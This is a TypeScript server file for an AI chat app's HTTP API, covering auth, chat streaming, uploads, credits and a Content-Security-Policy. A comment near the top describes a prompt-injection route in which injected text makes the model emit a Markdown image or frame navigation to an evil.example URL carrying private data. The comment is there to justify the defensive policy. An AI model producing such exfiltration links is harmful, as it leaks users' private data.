import { join } from "node:path";
import { serveStatic } from "@hono/node-server/serve-static";
import { type Context, Hono } from "hono";
import { bodyLimit } from "hono/body-limit";
import { compress } from "hono/compress";
import { etag } from "hono/etag";
import type { hc } from "hono/client";
import { HTTPException } from "hono/http-exception";
import { createUIMessageStreamResponse, type UIMessage } from "ai";
import * as Effect from "effect/Effect";
import { z } from "zod";
import { ARTIFACT_CDNS } from "../shared/cdns.ts";
import { adminApi } from "./admin/routes.ts";
import { connectorsApi, oauthCallback } from "./mcp/routes.ts";
import { displayName } from "./admin/people.ts";
import { appOrigin, auth, type SignedInEnv } from "./auth.ts";
import { bootPage, meOf, skillOptions } from "./boot-page.ts";
import { sessionOf } from "./session-cache.ts";
import { creditStatus } from "./credits.ts";
import { askForCredits } from "./extra-credits.ts";
import { loadFile, MAX_FILE_BYTES, saveFile } from "./files.ts";
import { memoryFor } from "./memory.ts";
import { memoryApi } from "./memory/routes.ts";
import * as Models from "./models/Models.ts";
import * as Notify from "./notify/Notify.ts";
import { chatLimit, creditRequestLimit, limitPerPerson, searchLimit, uploadLimit as uploadRate, type RateLimit } from "./rate-limit.ts";
import { searchThreads } from "./thread-search.ts";
import * as Database from "./runtime/Database.ts";
import { route } from "./runtime/route.ts";
import { runPromise } from "./runtime/runtime.ts";
import { pythonReady } from "./startup.ts";
import { isFirstMessage, nameThread } from "./thread-title.ts";
import { threadResponse } from "./thread-cache.ts";
import * as Threads from "./threads/Threads.ts";
import * as Runs from "./telemetry/Runs.ts";
import { recordReplySpan, withReplyTrace } from "./tracing/reply-trace.ts";
import { validate } from "./validate.ts";
import { WEB_BUILD } from "./web-build.ts";
import { deleteChat, followReply, startReply, stopReply, whenReplyFinished } from "./workflow/replies.ts";

/**
 * The HTTP API, served by Nitro (nitro.config.ts), which also compiles the chat workflow
 * ("use workflow", "use step") and serves the workflow's internal flow route. Start-up
 * work (migrations, the Postgres World's worker) is in server/plugins/startup.ts.
 */
type Env = SignedInEnv;
const app = new Hono<Env>();

/**
 * What the app's pages may load. A reply is Markdown, and a Markdown image loads by
 * itself as soon as the reply shows: text that a page or an email put in front of the
 * model could make it write ![](https://evil.example/?d=<something private>), and the
 * browser would send the data out with nobody clicking. So images and media load only
 * from this server, data and blob URLs, and the CDNs an HTML artifact may use (its frame
 * is held to this policy too). Scripts, styles and fetch are left as they are.
 *
 * No frame may load an address. An HTML artifact runs script in its frame, and could
 * send the frame itself to https://evil.example/?d=<something private>. Its own policy
 * (web/artifacts/html.ts) cannot stop that, but this one can: a browser checks where a
 * frame goes against the page that holds it. Every frame in the app is a srcdoc frame,
 * which loads no address, so they all still show.
 */
const PAGE_POLICY = [
	`img-src 'self' data: blob: ${ARTIFACT_CDNS.join(" ")}`,
	"media-src 'self' data: blob:",
	"object-src 'none'",
	"frame-src 'none'",
	"form-action 'self'",
	"base-uri 'self'",
].join("; ");

// The API's files set their own policy (/api/files/:id), and JSON needs none.
app.use("*", async (c, next) => {
	await next();
	if (!c.req.path.startsWith("/api/") && !c.res.headers.has("Content-Security-Policy")) c.res.headers.set("Content-Security-Policy", PAGE_POLICY);
});

// For the uptime checks: the server answers and its database does, within 3 seconds. 503 otherwise.
// The reference for a thin route (docs/effect.md): one effect, its failures mapped to answers.
const databaseUnavailable = (_: unknown, c: Context) => c.text("database unavailable", 503);
app.get("/health", (c) =>
	route(c, Database.pingWithin("3 seconds").pipe(Effect.map(() => c.text("ok"))), {
		SqlError: databaseUnavailable,
		TimeoutError: databaseUnavailable,
	}),
);

// The end of a connector's OAuth sign-in (mcp/routes.ts). It reads the session itself.
app.get("/oauth/mcp/callback", oauthCallback);

// Sign-in (auth.ts): magic links, sessions. Every other /api route needs a signed-in person.
app.on(["GET", "POST"], "/api/auth/*", (c) => auth.handler(c.req.raw));
app.use("/api/*", async (c, next) => {
	const session = await sessionOf(c.req.raw.headers);
	if (!session) return c.json({ error: "Sign in first." }, 401);
	c.set("user", session.user);
	await next();
});
const userOf = (c: Context<Env>) => c.get("user").id;
/** At most so many uses per person (rate-limit.ts). */
const perPerson = (limit: RateLimit, options?: { plain?: boolean }) => limitPerPerson(limit, (c: Context<Env>) => userOf(c), options);

// A repeated or odd query value is ignored, not refused.
const searchQuery = z.object({ q: z.string().default("").catch("").transform((q) => q.slice(0, 200)) });
const threadTitle = z.object({ title: z.string().optional().transform((title) => (title ?? "").slice(0, 120)) });
// The messages are the AI SDK's UIMessages, which the workflow reads; only the shape is checked here.
const chatBody = z.object({ id: z.string(), messages: z.array(z.custom<UIMessage>()).min(1), model: z.string().optional() });
const streamQuery = z.object({ startIndex: z.coerce.number().int().min(0).max(Number.MAX_SAFE_INTEGER).default(0).catch(0) });
const memoryQuery = z.object({ wait: z.string().optional().catch(undefined) });
const usageQuery = z.object({ thread: z.string().optional().catch(undefined) });

// Files attached in the chat. Each person sees only their own.
const uploadLimit = bodyLimit({
	maxSize: MAX_FILE_BYTES + 64 * 1024,
	onError: (c) => c.json({ error: "That file is larger than 10 MB." }, 413),
});

/**
 * The API that the web app calls. The routes are chained so that Hono can infer their
 * paths, inputs and answers: AppType below, for the typed client in web/api.ts.
 */
const api = app
	// Who is signed in, their role (read from the database, not the cookie), and their credits for today.
	.get("/api/me", async (c) => c.json(await meOf(c.get("user"))))

	// The admin pages' API (admin/routes.ts). Every route there needs the admin role.
	.route("/api/admin", adminApi)

	// Connectors: the MCP servers each person connected (server/mcp/).
	.route("/api/connectors", connectorsApi)

	// Whether the chat can run Python, for the attach button.
	.get("/api/features", async (c) => c.json({ python: await pythonReady }))

	// The models a person can pick (only those with Zero Data Retention), and the one picked when they have not chosen.
	.get("/api/models", (c) =>
		route(
			c,
			Effect.map(
				Models.Models.use((models) => models.available),
				(available) => c.json(available),
			),
		),
	)

	// The skills that are on, for the $ menu: names and descriptions, not the instructions.
	.get("/api/skills", async (c) => c.json({ skills: await skillOptions() }))

	.get("/api/credits", async (c) => c.json(await creditStatus(userOf(c))))

	// Out of credits: ask the admins for more (extra-credits.ts). One request waits at a time.
	.post("/api/credits/request", perPerson(creditRequestLimit), async (c) => {
		const status = await creditStatus(userOf(c));
		if (status.request?.status === "pending") return c.json({ error: "You asked already. The admins have not answered yet." }, 409);
		if (status.remaining > 0) return c.json({ error: "You still have credits for today." }, 400);
		if (!(await askForCredits(userOf(c)))) return c.json({ error: "You asked already. The admins have not answered yet." }, 409);
		const { name, email } = c.get("user");
		const used = status.used >= 100 ? Math.round(status.used) : status.used;
		const message = `${displayName(name, email)} asked for more credits (${used} of ${status.limit} used today).`;
		await runPromise(Notify.Notify.use((notify) => notify.admins("Ponder Chat: credit request", message, `${appOrigin(c.req.raw.headers)}/admin/requests`)));
		return c.json(await creditStatus(userOf(c)));
	})

	// The list revalidates by its content and goes gzipped; one thread has its own cache (thread-cache.ts).
	.get("/api/threads", compress(), etag(), (c) =>
		route(
			c,
			Effect.map(
				Threads.Threads.use((threads) => threads.list(userOf(c))),
				(threads) => c.json({ threads }),
			),
		),
	)

	// Search in the person's chats (thread-search.ts). Before /api/threads/:id, which would take "search" as an id.
	.get("/api/threads/search", perPerson(searchLimit), validate("query", searchQuery), async (c) =>
		c.json({ threads: await searchThreads(userOf(c), c.req.valid("query").q) }),
	)

	.patch("/api/threads/:id", validate("json", threadTitle), (c) =>
		route(
			c,
			Effect.map(
				Threads.Threads.use((threads) => threads.rename(c.req.param("id"), userOf(c), c.req.valid("json").title)),
				(renamed) => (renamed ? c.json({ ok: true }) : c.json({ error: "Not found" }, 404)),
			),
		),
	)

	// A reply still running stops first (workflow/replies.ts).
	.delete("/api/threads/:id", async (c) =>
		(await deleteChat(c.req.param("id"), userOf(c))) ? c.json({ ok: true }) : c.json({ error: "Not found" }, 404),
	)

	.get("/api/threads/:id", (c) => threadResponse(c, c.req.param("id"), userOf(c)))

	// A run with no messages fails before it writes, and its stream would never close, so chatBody refuses it.
	.post("/api/chat", perPerson(chatLimit, { plain: true }), validate("json", chatBody, { error: "Nothing to send.", plain: true }), async (c) => {
		const body = c.req.valid("json");
		// The chat transport shows the response text as the error, so this one is plain text.
		const checking = Date.now();
		const credits = await creditStatus(userOf(c));
		const checked = Date.now();
		if (credits.remaining <= 0) return c.text(outOfCredits(credits.resetsAt), 402);
		const reply = await startReply({ threadId: body.id, owner: userOf(c), messages: body.messages, model: body.model });
		if (!reply) return c.json({ error: "Not found" }, 404);
		// Measured before the run had an id, so recorded into its trace now (server/tracing/reply-trace.ts).
		if (!reply.followed) recordReplySpan(reply.runId, "credits.check", checking, checked);
		// A new thread gets a name from a cheap model while the reply is written (thread-title.ts).
		if (!reply.followed && isFirstMessage(body.messages)) withReplyTrace(reply.runId, () => void nameThread({ threadId: body.id, user: userOf(c) }, body.messages));
		return createUIMessageStreamResponse({ stream: reply.stream, headers: { "x-workflow-run-id": reply.runId } });
	})

	// A reply, from its start or from `startIndex` (the UI chunks the page already has).
	// :id is the thread (a reloaded page) or the run (WorkflowChatTransport after a dropped
	// connection). 204 when the thread has no run.
	.get("/api/chat/:id/stream", validate("query", streamQuery), async (c) => {
		const reply = await followReply(c.req.param("id"), userOf(c), c.req.valid("query").startIndex);
		if (!reply) return c.body(null, 204);
		return createUIMessageStreamResponse({ stream: reply.stream, headers: { "x-workflow-run-id": reply.runId } });
	})

	// Stop: closing the request does not end a run; this does.
	.post("/api/chat/:id/stop", async (c) => c.json({ stopped: await stopReply(c.req.param("id"), userOf(c)) }))

	// Memory (server/memory/routes.ts): what Ponder remembers about the person, and the decisions behind it.
	.route("/api/memory", memoryApi)

	// A chat's memory decisions. With ?wait=1, first waits for the reply to be saved and its memory save to end.
	.get("/api/threads/:id/memory", validate("query", memoryQuery), async (c) => {
		const threadId = c.req.param("id");
		const wait = Boolean(c.req.valid("query").wait);
		if (wait) await whenReplyFinished(threadId);
		return c.json({ saves: await memoryFor(userOf(c)).threadSaves(threadId, { settle: wait }) });
	})

	// The upload is a form, read by the route: a form validator would read the body
	// itself and turn "too large" (uploadLimit) into a 400.
	.post("/api/files", perPerson(uploadRate), uploadLimit, async (c) => {
		const form = await c.req.formData();
		const file = form.get("file");
		if (!(file instanceof File)) return c.json({ error: "No file in the upload." }, 400);
		const result = await saveFile(userOf(c), file);
		return "error" in result ? c.json(result, 400) : c.json(result.file);
	})

	.get("/api/files/:id", async (c) => {
		const file = await loadFile(c.req.param("id"), userOf(c));
		if (!file) return c.json({ error: "Not found" }, 404);
		// Only types that cannot run script open in the browser. Anything else (HTML or SVG that Python wrote) downloads, sandboxed.
		const inline = INLINE_TYPES.has(file.media_type);
		return c.body(new Uint8Array(file.data), 200, {
			"Content-Type": file.media_type,
			"Content-Disposition": `${inline ? "inline" : "attachment"}; filename*=UTF-8''${encodeURIComponent(file.name)}`,
			"Cache-Control": "private, max-age=31536000, immutable",
			"X-Content-Type-Options": "nosniff",
			...(!inline && { "Content-Security-Policy": "default-src 'none'; sandbox" }),
		});
	})

	// Tokens and cost of a person's runs, optionally for one thread.
	.get("/api/usage", validate("query", usageQuery), (c) =>
		route(
			c,
			Effect.map(
				Runs.Runs.use((runs) => runs.usageReport({ user: userOf(c), thread: c.req.valid("query").thread })),
				(report) => c.json(report),
			),
		),
	);

/** The API's routes, for the typed client (web/api.ts). Import it as a type only, so no server code reaches the browser. */
export type AppType = typeof api;
/** The typed client itself. web/api.ts declares its client with it, so a check without the server can replace it (web/server-stub.d.ts). */
export type ApiClient = ReturnType<typeof hc<AppType>>;

// The admin pages are their own app (web/admin.html) with its own routes under /admin/.
const adminPage = serveStatic({ path: join(WEB_BUILD, "admin.html") });
app.get("/admin", adminPage);
app.get("/admin/*", adminPage);

// The chat page, with the data its first screen needs (boot-page.ts).
app.get("/", bootPage);

// Vite names each file in assets/ by its content, so a browser may keep it for good: a new
// build has new names. Without this, Cloudflare told browsers to keep them 4 hours, after
// which each visit asked again for every file.
app.use("/assets/*", async (c, next) => {
	await next();
	if (c.res.status === 200) c.res.headers.set("Cache-Control", "public, max-age=31536000, immutable");
});
// The build keeps brotli and gzip copies of its text files, at the highest levels (scripts/compress-web.ts).
app.use("/*", serveStatic({ root: WEB_BUILD, precompressed: true }));

// An unknown API address answers in the API's shape. Any other is Hono's own 404, as before.
app.notFound((c) => (c.req.path.startsWith("/api/") ? c.json({ error: "Not found" }, 404) : c.text("404 Not Found", 404)));

// The sub-apps (admin, connectors, memory) have no handler of their own, so their errors end here too.
app.onError((error, c) => {
	// A refusal that a route or middleware threw carries its own answer.
	if (error instanceof HTTPException) return error.getResponse();
	console.error(`request failed: ${c.req.method} ${c.req.path}:`, error);
	const message = "Something went wrong. Try again.";
	if (isChat(c.req.path)) return c.text(message, 500);
	return c.req.path.startsWith("/api/") ? c.json({ error: message }, 500) : c.text("Internal Server Error", 500);
});

export default app;

/** The chat routes answer in plain text: the chat transport shows the response text as the error. */
function isChat(path: string) {
	return path === "/api/chat" || path.startsWith("/api/chat/");
}

function outOfCredits(resetsAt: string) {
	const hours = Math.max(1, Math.ceil((new Date(resetsAt).getTime() - Date.now()) / 3_600_000));
	return `You have used today's credits. They refill in about ${hours} hour${hours === 1 ? "" : "s"}.`;
}

const INLINE_TYPES = new Set(["image/png", "image/jpeg", "image/gif", "image/webp", "application/pdf", "text/plain", "text/csv", "text/tab-separated-values", "text/markdown", "application/json"]);
